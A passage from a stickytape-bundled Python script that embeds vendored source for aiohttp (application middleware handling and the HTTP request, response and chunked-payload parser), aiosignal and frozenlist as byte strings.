task,\r\n            self._loop,\r\n            client_max_size=self._client_max_size,\r\n        )\r\n\r\n    def _prepare_middleware(self) -> Iterator[Tuple[_Middleware, bool]]:\r\n        for m in reversed(self._middlewares):\r\n            if getattr(m, "__middleware_version__", None) == 1:\r\n                yield m, True\r\n            else:\r\n                warnings.warn(\r\n                    \'old-style middleware "{!r}" deprecated, \' "see #2252".format(m),\r\n                    DeprecationWarning,\r\n                    stacklevel=2,\r\n                )\r\n                yield m, False\r\n\r\n        yield _fix_request_current_app(self), True\r\n\r\n    async def _handle(self, request: Request) -> StreamResponse:\r\n        loop = asyncio.get_event_loop()\r\n        debug = loop.get_debug()\r\n        match_info = await self._router.resolve(request)\r\n        if debug:  # pragma: no cover\r\n            if not isinstance(match_info, AbstractMatchInfo):\r\n                raise TypeError(\r\n                    "match_info should be AbstractMatchInfo "\r\n                    "instance, not {!r}".format(match_info)\r\n                )\r\n        match_info.add_app(self)\r\n\r\n        match_info.freeze()\r\n\r\n        resp = None\r\n        request._match_info = match_info\r\n        expect = request.headers.get(hdrs.EXPECT)\r\n        if expect:\r\n            resp = await match_info.expect_handler(request)\r\n            await request.writer.drain()\r\n\r\n        if resp is None:\r\n            handler = match_info.handler\r\n\r\n            if self._run_middlewares:\r\n                for app in match_info.apps[::-1]:\r\n                    for m, new_style in app._middlewares_handlers:  # type: ignore[union-attr] # noqa\r\n                        if new_style:\r\n                            handler = update_wrapper(\r\n                                partial(m, handler=handler), handler\r\n                            )\r\n                        else:\r\n                            handler = await m(app, handler)  # type: ignore[arg-type]\r\n\r\n            resp = await handler(request)\r\n\r\n        return resp\r\n\r\n    def __call__(self) -> "Application":\r\n        """gunicorn compatibility"""\r\n        return self\r\n\r\n    def __repr__(self) -> str:\r\n        return f"<Application 0x{id(self):x}>"\r\n\r\n    def __bool__(self) -> bool:\r\n        return True\r\n\r\n\r\nclass CleanupError(RuntimeError):\r\n    @property\r\n    def exceptions(self) -> List[BaseException]:\r\n        return cast(List[BaseException], self.args[1])\r\n\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    _CleanupContextBase = FrozenList[Callable[[Application], AsyncIterator[None]]]\r\nelse:\r\n    _CleanupContextBase = FrozenList\r\n\r\n\r\nclass CleanupContext(_CleanupContextBase):\r\n    def __init__(self) -> None:\r\n        super().__init__()\r\n        self._exits = []  # type: List[AsyncIterator[None]]\r\n\r\n    async def _on_startup(self, app: Application) -> None:\r\n        for cb in self:\r\n            it = cb(app).__aiter__()\r\n            await it.__anext__()\r\n            self._exits.append(it)\r\n\r\n    async def _on_cleanup(self, app: Application) -> None:\r\n        errors = []\r\n        for it in reversed(self._exits):\r\n            try:\r\n                await it.__anext__()\r\n            except StopAsyncIteration:\r\n                pass\r\n            except Exception as exc:\r\n                errors.append(exc)\r\n            else:\r\n                errors.append(RuntimeError(f"{it!r} has more than one \'yield\'"))\r\n        if errors:\r\n            if len(errors) == 1:\r\n                raise errors[0]\r\n            else:\r\n                raise CleanupError("Multiple errors on cleanup stage", errors)\r\n')
    __stickytape_write_module('aiosignal/__init__.py', b'from frozenlist import FrozenList\n\n__version__ = "1.2.0"\n\n__all__ = ("Signal",)\n\n\nclass Signal(FrozenList):\n    """Coroutine-based signal implementation.\n\n    To connect a callback to a signal, use any list method.\n\n    Signals are fired using the send() coroutine, which takes named\n    arguments.\n    """\n\n    __slots__ = ("_owner",)\n\n    def __init__(self, owner):\n        super().__init__()\n        self._owner = owner\n\n    def __repr__(self):\n        return "<Signal owner={}, frozen={}, {!r}>".format(\n            self._owner, self.frozen, list(self)\n        )\n\n    async def send(self, *args, **kwargs):\n        """\n        Sends data to all registered receivers.\n        """\n        if not self.frozen:\n            raise RuntimeError("Cannot send non-frozen signal.")\n\n        for receiver in self:\n            await receiver(*args, **kwargs)  # type: ignore\n')
    __stickytape_write_module('frozenlist/__init__.py', b'import os\r\nimport sys\r\nimport types\r\nfrom collections.abc import MutableSequence\r\nfrom functools import total_ordering\r\nfrom typing import Tuple, Type\r\n\r\n__version__ = "1.3.0"\r\n\r\n__all__ = ("FrozenList", "PyFrozenList")  # type: Tuple[str, ...]\r\n\r\n\r\nNO_EXTENSIONS = bool(os.environ.get("FROZENLIST_NO_EXTENSIONS"))  # type: bool\r\n\r\n\r\n@total_ordering\r\nclass FrozenList(MutableSequence):\r\n\r\n    __slots__ = ("_frozen", "_items")\r\n\r\n    if sys.version_info >= (3, 9):\r\n        __class_getitem__ = classmethod(types.GenericAlias)\r\n    else:\r\n\r\n        @classmethod\r\n        def __class_getitem__(cls: Type["FrozenList"]) -> Type["FrozenList"]:\r\n            return cls\r\n\r\n    def __init__(self, items=None):\r\n        self._frozen = False\r\n        if items is not None:\r\n            items = list(items)\r\n        else:\r\n            items = []\r\n        self._items = items\r\n\r\n    @property\r\n    def frozen(self):\r\n        return self._frozen\r\n\r\n    def freeze(self):\r\n        self._frozen = True\r\n\r\n    def __getitem__(self, index):\r\n        return self._items[index]\r\n\r\n    def __setitem__(self, index, value):\r\n        if self._frozen:\r\n            raise RuntimeError("Cannot modify frozen list.")\r\n        self._items[index] = value\r\n\r\n    def __delitem__(self, index):\r\n        if self._frozen:\r\n            raise RuntimeError("Cannot modify frozen list.")\r\n        del self._items[index]\r\n\r\n    def __len__(self):\r\n        return self._items.__len__()\r\n\r\n    def __iter__(self):\r\n        return self._items.__iter__()\r\n\r\n    def __reversed__(self):\r\n        return self._items.__reversed__()\r\n\r\n    def __eq__(self, other):\r\n        return list(self) == other\r\n\r\n    def __le__(self, other):\r\n        return list(self) <= other\r\n\r\n    def insert(self, pos, item):\r\n        if self._frozen:\r\n            raise RuntimeError("Cannot modify frozen list.")\r\n        self._items.insert(pos, item)\r\n\r\n    def __repr__(self):\r\n        return f"<FrozenList(frozen={self._frozen}, {self._items!r})>"\r\n\r\n    def __hash__(self):\r\n        if self._frozen:\r\n            return hash(tuple(self))\r\n        else:\r\n            raise RuntimeError("Cannot hash unfrozen list.")\r\n\r\n\r\nPyFrozenList = FrozenList\r\n\r\n\r\ntry:\r\n    from ._frozenlist import FrozenList as CFrozenList  # type: ignore\r\n\r\n    if not NO_EXTENSIONS:  # pragma: no cover\r\n        FrozenList = CFrozenList  # type: ignore\r\nexcept ImportError:  # pragma: no cover\r\n    pass\r\n')
    __stickytape_write_module('aiohttp/http_parser.py', b'import abc\r\nimport asyncio\r\nimport collections\r\nimport re\r\nimport string\r\nimport zlib\r\nfrom contextlib import suppress\r\nfrom enum import IntEnum\r\nfrom typing import (\r\n    Any,\r\n    Generic,\r\n    List,\r\n    NamedTuple,\r\n    Optional,\r\n    Pattern,\r\n    Set,\r\n    Tuple,\r\n    Type,\r\n    TypeVar,\r\n    Union,\r\n    cast,\r\n)\r\n\r\nfrom multidict import CIMultiDict, CIMultiDictProxy, istr\r\nfrom yarl import URL\r\n\r\nfrom . import hdrs\r\nfrom .base_protocol import BaseProtocol\r\nfrom .helpers import NO_EXTENSIONS, BaseTimerContext\r\nfrom .http_exceptions import (\r\n    BadHttpMessage,\r\n    BadStatusLine,\r\n    ContentEncodingError,\r\n    ContentLengthError,\r\n    InvalidHeader,\r\n    LineTooLong,\r\n    TransferEncodingError,\r\n)\r\nfrom .http_writer import HttpVersion, HttpVersion10\r\nfrom .log import internal_logger\r\nfrom .streams import EMPTY_PAYLOAD, StreamReader\r\nfrom .typedefs import Final, RawHeaders\r\n\r\ntry:\r\n    import brotli\r\n\r\n    HAS_BROTLI = True\r\nexcept ImportError:  # pragma: no cover\r\n    HAS_BROTLI = False\r\n\r\n\r\n__all__ = (\r\n    "HeadersParser",\r\n    "HttpParser",\r\n    "HttpRequestParser",\r\n    "HttpResponseParser",\r\n    "RawRequestMessage",\r\n    "RawResponseMessage",\r\n)\r\n\r\nASCIISET: Final[Set[str]] = set(string.printable)\r\n\r\n# See https://tools.ietf.org/html/rfc7230#section-3.1.1\r\n# and https://tools.ietf.org/html/rfc7230#appendix-B\r\n#\r\n#     method = token\r\n#     tchar = "!" / "#" / "$" / "%" / "&" / "\'" / "*" / "+" / "-" / "." /\r\n#             "^" / "_" / "`" / "|" / "~" / DIGIT / ALPHA\r\n#     token = 1*tchar\r\nMETHRE: Final[Pattern[str]] = re.compile(r"[!#$%&\'*+\\-.^_`|~0-9A-Za-z]+")\r\nVERSRE: Final[Pattern[str]] = re.compile(r"HTTP/(\\d+).(\\d+)")\r\nHDRRE: Final[Pattern[bytes]] = re.compile(rb"[\\x00-\\x1F\\x7F()<>@,;:\\[\\]={} \\t\\\\\\\\\\"]")\r\n\r\n\r\nclass RawRequestMessage(NamedTuple):\r\n    method: str\r\n    path: str\r\n    version: HttpVersion\r\n    headers: "CIMultiDictProxy[str]"\r\n    raw_headers: RawHeaders\r\n    should_close: bool\r\n    compression: Optional[str]\r\n    upgrade: bool\r\n    chunked: bool\r\n    url: URL\r\n\r\n\r\nRawResponseMessage = collections.namedtuple(\r\n    "RawResponseMessage",\r\n    [\r\n        "version",\r\n        "code",\r\n        "reason",\r\n        "headers",\r\n        "raw_headers",\r\n        "should_close",\r\n        "compression",\r\n        "upgrade",\r\n        "chunked",\r\n    ],\r\n)\r\n\r\n\r\n_MsgT = TypeVar("_MsgT", RawRequestMessage, RawResponseMessage)\r\n\r\n\r\nclass ParseState(IntEnum):\r\n\r\n    PARSE_NONE = 0\r\n    PARSE_LENGTH = 1\r\n    PARSE_CHUNKED = 2\r\n    PARSE_UNTIL_EOF = 3\r\n\r\n\r\nclass ChunkState(IntEnum):\r\n    PARSE_CHUNKED_SIZE = 0\r\n    PARSE_CHUNKED_CHUNK = 1\r\n    PARSE_CHUNKED_CHUNK_EOF = 2\r\n    PARSE_MAYBE_TRAILERS = 3\r\n    PARSE_TRAILERS = 4\r\n\r\n\r\nclass HeadersParser:\r\n    def __init__(\r\n        self,\r\n        max_line_size: int = 8190,\r\n        max_headers: int = 32768,\r\n        max_field_size: int = 8190,\r\n    ) -> None:\r\n        self.max_line_size = max_line_size\r\n        self.max_headers = max_headers\r\n        self.max_field_size = max_field_size\r\n\r\n    def parse_headers(\r\n        self, lines: List[bytes]\r\n    ) -> Tuple["CIMultiDictProxy[str]", RawHeaders]:\r\n        headers = CIMultiDict()  # type: CIMultiDict[str]\r\n        raw_headers = []\r\n\r\n        lines_idx = 1\r\n        line = lines[1]\r\n        line_count = len(lines)\r\n\r\n        while line:\r\n            # Parse initial header name : value pair.\r\n            try:\r\n                bname, bvalue = line.split(b":", 1)\r\n            except ValueError:\r\n                raise InvalidHeader(line) from None\r\n\r\n            bname = bname.strip(b" \\t")\r\n            bvalue = bvalue.lstrip()\r\n            if HDRRE.search(bname):\r\n                raise InvalidHeader(bname)\r\n            if len(bname) > self.max_field_size:\r\n                raise LineTooLong(\r\n                    "request header name {}".format(\r\n                        bname.decode("utf8", "xmlcharrefreplace")\r\n                    ),\r\n                    str(self.max_field_size),\r\n                    str(len(bname)),\r\n                )\r\n\r\n            header_length = len(bvalue)\r\n\r\n            # next line\r\n            lines_idx += 1\r\n            line = lines[lines_idx]\r\n\r\n            # consume continuation lines\r\n            continuation = line and line[0] in (32, 9)  # (\' \', \'\\t\')\r\n\r\n            if continuation:\r\n                bvalue_lst = [bvalue]\r\n                while continuation:\r\n                    header_length += len(line)\r\n                    if header_length > self.max_field_size:\r\n                        raise LineTooLong(\r\n                            "request header field {}".format(\r\n                                bname.decode("utf8", "xmlcharrefreplace")\r\n                            ),\r\n                            str(self.max_field_size),\r\n                            str(header_length),\r\n                        )\r\n                    bvalue_lst.append(line)\r\n\r\n                    # next line\r\n                    lines_idx += 1\r\n                    if lines_idx < line_count:\r\n                        line = lines[lines_idx]\r\n                        if line:\r\n                            continuation = line[0] in (32, 9)  # (\' \', \'\\t\')\r\n                    else:\r\n                        line = b""\r\n                        break\r\n                bvalue = b"".join(bvalue_lst)\r\n            else:\r\n                if header_length > self.max_field_size:\r\n                    raise LineTooLong(\r\n                        "request header field {}".format(\r\n                            bname.decode("utf8", "xmlcharrefreplace")\r\n                        ),\r\n                        str(self.max_field_size),\r\n                        str(header_length),\r\n                    )\r\n\r\n            bvalue = bvalue.strip()\r\n            name = bname.decode("utf-8", "surrogateescape")\r\n            value = bvalue.decode("utf-8", "surrogateescape")\r\n\r\n            headers.add(name, value)\r\n            raw_headers.append((bname, bvalue))\r\n\r\n        return (CIMultiDictProxy(headers), tuple(raw_headers))\r\n\r\n\r\nclass HttpParser(abc.ABC, Generic[_MsgT]):\r\n    def __init__(\r\n        self,\r\n        protocol: Optional[BaseProtocol] = None,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n        limit: int = 2 ** 16,\r\n        max_line_size: int = 8190,\r\n        max_headers: int = 32768,\r\n        max_field_size: int = 8190,\r\n        timer: Optional[BaseTimerContext] = None,\r\n        code: Optional[int] = None,\r\n        method: Optional[str] = None,\r\n        readall: bool = False,\r\n        payload_exception: Optional[Type[BaseException]] = None,\r\n        response_with_body: bool = True,\r\n        read_until_eof: bool = False,\r\n        auto_decompress: bool = True,\r\n    ) -> None:\r\n        self.protocol = protocol\r\n        self.loop = loop\r\n        self.max_line_size = max_line_size\r\n        self.max_headers = max_headers\r\n        self.max_field_size = max_field_size\r\n        self.timer = timer\r\n        self.code = code\r\n        self.method = method\r\n        self.readall = readall\r\n        self.payload_exception = payload_exception\r\n        self.response_with_body = response_with_body\r\n        self.read_until_eof = read_until_eof\r\n\r\n        self._lines = []  # type: List[bytes]\r\n        self._tail = b""\r\n        self._upgraded = False\r\n        self._payload = None\r\n        self._payload_parser = None  # type: Optional[HttpPayloadParser]\r\n        self._auto_decompress = auto_decompress\r\n        self._limit = limit\r\n        self._headers_parser = HeadersParser(max_line_size, max_headers, max_field_size)\r\n\r\n    @abc.abstractmethod\r\n    def parse_message(self, lines: List[bytes]) -> _MsgT:\r\n        pass\r\n\r\n    def feed_eof(self) -> Optional[_MsgT]:\r\n        if self._payload_parser is not None:\r\n            self._payload_parser.feed_eof()\r\n            self._payload_parser = None\r\n        else:\r\n            # try to extract partial message\r\n            if self._tail:\r\n                self._lines.append(self._tail)\r\n\r\n            if self._lines:\r\n                if self._lines[-1] != "\\r\\n":\r\n                    self._lines.append(b"")\r\n                with suppress(Exception):\r\n                    return self.parse_message(self._lines)\r\n        return None\r\n\r\n    def feed_data(\r\n        self,\r\n        data: bytes,\r\n        SEP: bytes = b"\\r\\n",\r\n        EMPTY: bytes = b"",\r\n        CONTENT_LENGTH: istr = hdrs.CONTENT_LENGTH,\r\n        METH_CONNECT: str = hdrs.METH_CONNECT,\r\n        SEC_WEBSOCKET_KEY1: istr = hdrs.SEC_WEBSOCKET_KEY1,\r\n    ) -> Tuple[List[Tuple[_MsgT, StreamReader]], bool, bytes]:\r\n\r\n        messages = []\r\n\r\n        if self._tail:\r\n            data, self._tail = self._tail + data, b""\r\n\r\n        data_len = len(data)\r\n        start_pos = 0\r\n        loop = self.loop\r\n\r\n        while start_pos < data_len:\r\n\r\n            # read HTTP message (request/response line + headers), \\r\\n\\r\\n\r\n            # and split by lines\r\n            if self._payload_parser is None and not self._upgraded:\r\n                pos = data.find(SEP, start_pos)\r\n                # consume \\r\\n\r\n                if pos == start_pos and not self._lines:\r\n                    start_pos = pos + 2\r\n                    continue\r\n\r\n                if pos >= start_pos:\r\n                    # line found\r\n                    self._lines.append(data[start_pos:pos])\r\n                    start_pos = pos + 2\r\n\r\n                    # \\r\\n\\r\\n found\r\n                    if self._lines[-1] == EMPTY:\r\n                        try:\r\n                            msg: _MsgT = self.parse_message(self._lines)\r\n                        finally:\r\n                            self._lines.clear()\r\n\r\n                        def get_content_length() -> Optional[int]:\r\n                            # payload length\r\n                            length_hdr = msg.headers.get(CONTENT_LENGTH)\r\n                            if length_hdr is None:\r\n                                return None\r\n\r\n                            try:\r\n                                length = int(length_hdr)\r\n                            except ValueError:\r\n                                raise InvalidHeader(CONTENT_LENGTH)\r\n\r\n                            if length < 0:\r\n                                raise InvalidHeader(CONTENT_LENGTH)\r\n\r\n                            return length\r\n\r\n                        length = get_content_length()\r\n                        # do not support old websocket spec\r\n                        if SEC_WEBSOCKET_KEY1 in msg.headers:\r\n                            raise InvalidHeader(SEC_WEBSOCKET_KEY1)\r\n\r\n                        self._upgraded = msg.upgrade\r\n\r\n                        method = getattr(msg, "method", self.method)\r\n\r\n                        assert self.protocol is not None\r\n                        # calculate payload\r\n                        if (\r\n                            (length is not None and length > 0)\r\n                            or msg.chunked\r\n                            and not msg.upgrade\r\n                        ):\r\n                            payload = StreamReader(\r\n                                self.protocol,\r\n                                timer=self.timer,\r\n                                loop=loop,\r\n                                limit=self._limit,\r\n                            )\r\n                            payload_parser = HttpPayloadParser(\r\n                                payload,\r\n                                length=length,\r\n                                chunked=msg.chunked,\r\n                                method=method,\r\n                                compression=msg.compression,\r\n                                code=self.code,\r\n                                readall=self.readall,\r\n                                response_with_body=self.response_with_body,\r\n                                auto_decompress=self._auto_decompress,\r\n                            )\r\n                            if not payload_parser.done:\r\n                                self._payload_parser = payload_parser\r\n                        elif method == METH_CONNECT:\r\n                            assert isinstance(msg, RawRequestMessage)\r\n                            payload = StreamReader(\r\n                                self.protocol,\r\n                                timer=self.timer,\r\n                                loop=loop,\r\n                                limit=self._limit,\r\n                            )\r\n                            self._upgraded = True\r\n                            self._payload_parser = HttpPayloadParser(\r\n                                payload,\r\n                                method=msg.method,\r\n                                compression=msg.compression,\r\n                                readall=True,\r\n                                auto_decompress=self._auto_decompress,\r\n                            )\r\n                        else:\r\n                            if (\r\n                                getattr(msg, "code", 100) >= 199\r\n                                and length is None\r\n                                and self.read_until_eof\r\n                            ):\r\n                                payload = StreamReader(\r\n                                    self.protocol,\r\n                                    timer=self.timer,\r\n                                    loop=loop,\r\n                                    limit=self._limit,\r\n                                )\r\n                                payload_parser = HttpPayloadParser(\r\n                                    payload,\r\n                                    length=length,\r\n                                    chunked=msg.chunked,\r\n                                    method=method,\r\n                                    compression=msg.compression,\r\n                                    code=self.code,\r\n                                    readall=True,\r\n                                    response_with_body=self.response_with_body,\r\n                                    auto_decompress=self._auto_decompress,\r\n                                )\r\n                                if not payload_parser.done:\r\n                                    self._payload_parser = payload_parser\r\n                            else:\r\n                                payload = EMPTY_PAYLOAD\r\n\r\n                        messages.append((msg, payload))\r\n                else:\r\n                    self._tail = data[start_pos:]\r\n                    data = EMPTY\r\n                    break\r\n\r\n            # no parser, just store\r\n            elif self._payload_parser is None and self._upgraded:\r\n                assert not self._lines\r\n                break\r\n\r\n            # feed payload\r\n            elif data and start_pos < data_len:\r\n                assert not self._lines\r\n                assert self._payload_parser is not None\r\n                try:\r\n                    eof, data = self._payload_parser.feed_data(data[start_pos:])\r\n                except BaseException as exc:\r\n                    if self.payload_exception is not None:\r\n                        self._payload_parser.payload.set_exception(\r\n                            self.payload_exception(str(exc))\r\n                        )\r\n                    else:\r\n                        self._payload_parser.payload.set_exception(exc)\r\n\r\n                    eof = True\r\n                    data = b""\r\n\r\n                if eof:\r\n                    start_pos = 0\r\n                    data_len = len(data)\r\n                    self._payload_parser = None\r\n                    continue\r\n            else:\r\n                break\r\n\r\n        if data and start_pos < data_len:\r\n            data = data[start_pos:]\r\n        else:\r\n            data = EMPTY\r\n\r\n        return messages, self._upgraded, data\r\n\r\n    def parse_headers(\r\n        self, lines: List[bytes]\r\n    ) -> Tuple[\r\n        "CIMultiDictProxy[str]", RawHeaders, Optional[bool], Optional[str], bool, bool\r\n    ]:\r\n        """Parses RFC 5322 headers from a stream.\r\n\r\n        Line continuations are supported. Returns list of header name\r\n        and value pairs. Header name is in upper case.\r\n        """\r\n        headers, raw_headers = self._headers_parser.parse_headers(lines)\r\n        close_conn = None\r\n        encoding = None\r\n        upgrade = False\r\n        chunked = False\r\n\r\n        # keep-alive\r\n        conn = headers.get(hdrs.CONNECTION)\r\n        if conn:\r\n            v = conn.lower()\r\n            if v == "close":\r\n                close_conn = True\r\n            elif v == "keep-alive":\r\n                close_conn = False\r\n            elif v == "upgrade":\r\n                upgrade = True\r\n\r\n        # encoding\r\n        enc = headers.get(hdrs.CONTENT_ENCODING)\r\n        if enc:\r\n            enc = enc.lower()\r\n            if enc in ("gzip", "deflate", "br"):\r\n                encoding = enc\r\n\r\n        # chunking\r\n        te = headers.get(hdrs.TRANSFER_ENCODING)\r\n        if te is not None:\r\n            if "chunked" == te.lower():\r\n                chunked = True\r\n            else:\r\n                raise BadHttpMessage("Request has invalid `Transfer-Encoding`")\r\n\r\n            if hdrs.CONTENT_LENGTH in headers:\r\n                raise BadHttpMessage(\r\n                    "Content-Length can\'t be present with Transfer-Encoding",\r\n                )\r\n\r\n        return (headers, raw_headers, close_conn, encoding, upgrade, chunked)\r\n\r\n    def set_upgraded(self, val: bool) -> None:\r\n        """Set connection upgraded (to websocket) mode.\r\n\r\n        :param bool val: new state.\r\n        """\r\n        self._upgraded = val\r\n\r\n\r\nclass HttpRequestParser(HttpParser[RawRequestMessage]):\r\n    """Read request status line.\r\n\r\n    Exception .http_exceptions.BadStatusLine\r\n    could be raised in case of any errors in status line.\r\n    Returns RawRequestMessage.\r\n    """\r\n\r\n    def parse_message(self, lines: List[bytes]) -> RawRequestMessage:\r\n        # request line\r\n        line = lines[0].decode("utf-8", "surrogateescape")\r\n        try:\r\n            method, path, version = line.split(None, 2)\r\n        except ValueError:\r\n            raise BadStatusLine(line) from None\r\n\r\n        if len(path) > self.max_line_size:\r\n            raise LineTooLong(\r\n                "Status line is too long", str(self.max_line_size), str(len(path))\r\n            )\r\n\r\n        path_part, _hash_separator, url_fragment = path.partition("#")\r\n        path_part, _question_mark_separator, qs_part = path_part.partition("?")\r\n\r\n        # method\r\n        if not METHRE.match(method):\r\n            raise BadStatusLine(method)\r\n\r\n        # version\r\n        try:\r\n            if version.startswith("HTTP/"):\r\n                n1, n2 = version[5:].split(".", 1)\r\n                version_o = HttpVersion(int(n1), int(n2))\r\n            else:\r\n                raise BadStatusLine(version)\r\n        except Exception:\r\n            raise BadStatusLine(version)\r\n\r\n        # read headers\r\n        (\r\n            headers,\r\n            raw_headers,\r\n            close,\r\n            compression,\r\n            upgrade,\r\n            chunked,\r\n        ) = self.parse_headers(lines)\r\n\r\n        if close is None:  # then the headers weren\'t set in the request\r\n            if version_o <= HttpVersion10:  # HTTP 1.0 must asks to not close\r\n                close = True\r\n            else:  # HTTP 1.1 must ask to close.\r\n                close = False\r\n\r\n        return RawRequestMessage(\r\n            method,\r\n            path,\r\n            version_o,\r\n            headers,\r\n            raw_headers,\r\n            close,\r\n            compression,\r\n            upgrade,\r\n            chunked,\r\n            # NOTE: `yarl.URL.build()` is used to mimic what the Cython-based\r\n            # NOTE: parser does, otherwise it results into the same\r\n            # NOTE: HTTP Request-Line input producing different\r\n            # NOTE: `yarl.URL()` objects\r\n            URL.build(\r\n                path=path_part,\r\n                query_string=qs_part,\r\n                fragment=url_fragment,\r\n                encoded=True,\r\n            ),\r\n        )\r\n\r\n\r\nclass HttpResponseParser(HttpParser[RawResponseMessage]):\r\n    """Read response status line and headers.\r\n\r\n    BadStatusLine could be raised in case of any errors in status line.\r\n    Returns RawResponseMessage.\r\n    """\r\n\r\n    def parse_message(self, lines: List[bytes]) -> RawResponseMessage:\r\n        line = lines[0].decode("utf-8", "surrogateescape")\r\n        try:\r\n            version, status = line.split(None, 1)\r\n        except ValueError:\r\n            raise BadStatusLine(line) from None\r\n\r\n        try:\r\n            status, reason = status.split(None, 1)\r\n        except ValueError:\r\n            reason = ""\r\n\r\n        if len(reason) > self.max_line_size:\r\n            raise LineTooLong(\r\n                "Status line is too long", str(self.max_line_size), str(len(reason))\r\n            )\r\n\r\n        # version\r\n        match = VERSRE.match(version)\r\n        if match is None:\r\n            raise BadStatusLine(line)\r\n        version_o = HttpVersion(int(match.group(1)), int(match.group(2)))\r\n\r\n        # The status code is a three-digit number\r\n        try:\r\n            status_i = int(status)\r\n        except ValueError:\r\n            raise BadStatusLine(line) from None\r\n\r\n        if status_i > 999:\r\n            raise BadStatusLine(line)\r\n\r\n        # read headers\r\n        (\r\n            headers,\r\n            raw_headers,\r\n            close,\r\n            compression,\r\n            upgrade,\r\n            chunked,\r\n        ) = self.parse_headers(lines)\r\n\r\n        if close is None:\r\n            close = version_o <= HttpVersion10\r\n\r\n        return RawResponseMessage(\r\n            version_o,\r\n            status_i,\r\n            reason.strip(),\r\n            headers,\r\n            raw_headers,\r\n            close,\r\n            compression,\r\n            upgrade,\r\n            chunked,\r\n        )\r\n\r\n\r\nclass HttpPayloadParser:\r\n    def __init__(\r\n        self,\r\n        payload: StreamReader,\r\n        length: Optional[int] = None,\r\n        chunked: bool = False,\r\n        compression: Optional[str] = None,\r\n        code: Optional[int] = None,\r\n        method: Optional[str] = None,\r\n        readall: bool = False,\r\n        response_with_body: bool = True,\r\n        auto_decompress: bool = True,\r\n    ) -> None:\r\n        self._length = 0\r\n        self._type = ParseState.PARSE_NONE\r\n        self._chunk = ChunkState.PARSE_CHUNKED_SIZE\r\n        self._chunk_size = 0\r\n        self._chunk_tail = b""\r\n        self._auto_decompress = auto_decompress\r\n        self.done = False\r\n\r\n        # payload decompression wrapper\r\n        if response_with_body and compression and self._auto_decompress:\r\n            real_payload = DeflateBuffer(\r\n                payload, compression\r\n            )  # type: Union[StreamReader, DeflateBuffer]\r\n        else:\r\n            real_payload = payload\r\n\r\n        # payload parser\r\n        if not response_with_body:\r\n            # don\'t parse payload if it\'s not expected to be received\r\n            self._type = ParseState.PARSE_NONE\r\n            real_payload.feed_eof()\r\n            self.done = True\r\n\r\n        elif chunked:\r\n            self._type = ParseState.PARSE_CHUNKED\r\n        elif length is not None:\r\n            self._type = ParseState.PARSE_LENGTH\r\n            self._length = length\r\n            if self._length == 0:\r\n                real_payload.feed_eof()\r\n                self.done = True\r\n        else:\r\n            if readall and code != 204:\r\n                self._type = ParseState.PARSE_UNTIL_EOF\r\n            elif method in ("PUT", "POST"):\r\n                internal_logger.warning(  # pragma: no cover\r\n                    "Content-Length or Transfer-Encoding header is required"\r\n                )\r\n                self._type = ParseState.PARSE_NONE\r\n                real_payload.feed_eof()\r\n                self.done = True\r\n\r\n        self.payload = real_payload\r\n\r\n    def feed_eof(self) -> None:\r\n        if self._type == ParseState.PARSE_UNTIL_EOF:\r\n            self.payload.feed_eof()\r\n        elif self._type == ParseState.PARSE_LENGTH:\r\n            raise ContentLengthError(\r\n                "Not enough data for satisfy content length header."\r\n            )\r\n        elif self._type == ParseState.PARSE_CHUNKED:\r\n            raise TransferEncodingError(\r\n                "Not enough data for satisfy transfer length header."\r\n            )\r\n\r\n    def feed_data(\r\n        self, chunk: bytes, SEP: bytes = b"\\r\\n", CHUNK_EXT: bytes = b";"\r\n    ) -> Tuple[bool, bytes]:\r\n        # Read specified amount of bytes\r\n        if self._type == ParseState.PARSE_LENGTH:\r\n            required = self._length\r\n            chunk_len = len(chunk)\r\n\r\n            if required >= chunk_len:\r\n                self._length = required - chunk_len\r\n                self.payload.feed_data(chunk, chunk_len)\r\n                if self._length == 0:\r\n                    self.payload.feed_eof()\r\n                    return True, b""\r\n            else:\r\n                self._length = 0\r\n                self.payload.feed_data(chunk[:required], required)\r\n                self.payload.feed_eof()\r\n                return True, chunk[required:]\r\n\r\n        # Chunked transfer encoding parser\r\n        elif self._type == ParseState.PARSE_CHUNKED:\r\n            if self._chunk_tail:\r\n                chunk = self._chunk_tail + chunk\r\n                self._chunk_tail = b""\r\n\r\n            while chunk:\r\n\r\n                # read next chunk size\r\n                if self._chunk == ChunkState.PARSE_CHUNKED_SIZE:\r\n                    pos = chunk.find(SEP)\r\n                    if pos >= 0:\r\n                        i = chunk.find(CHUNK_EXT, 0, pos)\r\n                        if i >= 0:\r\n                            size_b = chunk[:i]  # strip chunk-extensions\r\n                        else:\r\n                            size_b = chunk[:pos]\r\n\r\n                        try:\r\n                            size = int(bytes(size_b), 16)\r\n                        except ValueError:\r\n                            exc = TransferEncodingError(\r\n                                chunk[:pos].decode("ascii", "surrogateescape")\r\n                            )\r\n                            self.payload.set_exception(exc)\r\n                            raise exc from None\r\n\r\n                        chunk = chunk[pos + 2 :]\r\n                        if size == 0:  # eof marker\r\n                            self._chunk = ChunkState.PARSE_MAYBE_TRAILERS\r\n                        else:\r\n                            self._chunk = ChunkState.PARSE_CHUNKED_CHUNK\r\n                            self._chunk_size = size\r\n                            self.payload.begin_http_chunk_receiving()\r\n                    else:\r\n                        self._chunk_tail = chunk\r\n                        return False, b""\r\n\r\n                # read chunk and feed buffer\r\n                if self._chunk == ChunkState.PARSE_CHUNKED_CHUNK:\r\n                    required = self._chunk_size\r\n                    chunk_len = len(chunk)\r\n\r\n                    if required > chunk_len:\r\n                        self._chunk_size = required - chunk_len\r\n                        self.payload.feed_data(chunk, chunk_len)\r\n                        return False, b""\r\n                    else:\r\n                        self._chunk_size = 0\r\n                        self.payload.feed_data(chunk[:required], required)\r\n                        chunk = chunk[required:]\r\n                        self._chunk = ChunkState.PARSE_CHUNKED_CHUNK_EOF\r\n                        self.payload.end_http_chunk_receiving()\r\n\r\n                # toss the CRLF at the end of the chunk\r\n                if self._chunk == ChunkState.PARSE_CHUNKED_CHUNK_EOF:\r\n                    if chunk[:2] == SEP:\r\n                        chunk = chunk[2:]\r\n                        self._chunk = ChunkState.PARSE_CHUNKED_SIZE\r\n                    else:\r\n                        self._chunk_tail = chunk\r\n                        return False, b""\r\n\r\n                # if stream does not contain trailer, after 0\\r\\n\r\n                # we should get another \\r\\n otherwise\r\n                # trailers needs to be skiped until \\r\\n\\r\\n\r\n                if self._chunk == ChunkState.PARSE_MAYBE_TRAILERS:\r\n                    head = chunk[:2]\r\n                    if head == SEP:\r\n                        # end of stream\r\n                        self.payload.feed_eof()\r\n                    